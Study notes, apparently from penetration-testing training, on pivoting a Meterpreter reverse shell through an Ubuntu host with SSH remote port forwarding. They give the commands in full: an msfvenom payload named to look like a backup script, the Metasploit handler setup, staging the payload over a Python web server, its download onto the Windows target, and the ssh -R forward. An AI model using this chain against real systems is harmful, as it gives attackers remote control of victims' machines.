- We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host.
- But sometimes, we might **want to forward a local service to the remote port as well.**

- There are several times during a penetration testing engagement when having just a remote desktop connection is not feasible. You might want **to `upload`/`download` files** (when the RDP clipboard is disabled), **`use exploits` or `low-level Windows API` using a Meterpreter session** to perform enumeration on the Windows host.
- In these cases, **we would have to find a pivot host, which is a common connection point** between our attack host and the Windows server.
- We can use this to get a reverse shell.

# Creating a Windows Payload with msfvenom
---
- Creating a Windows Payload with msfvenom:
	- `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`

- Configuring & Starting the multi/handler:
	- `use exploit/multi/handler`
	- `set payload windows/x64/meterpreter/reverse_https`
	- `set lhost 0.0.0.0`
	- `set lport 8000`
	- `run`

- Transferring Payload to Pivot Host:
	- `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`

- Starting Python3 Webserver on Pivot Host:
	- `python3 -m http.server 8123`

- Downloading Payload on the Windows Target:
	- `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`

- We will use `SSH remote port forwarding` **to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000.**
- We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell.

- The **`-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080`** and **forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000`** of our `attack host`:
	- `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`

- **==AttackMachine(metasploit):8000 <->PivotHost:22<-> PivotHost:8080  WindowsVictim==**
- After creating the SSH remote port forward, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

![[Pasted image 20250717063512.png]]
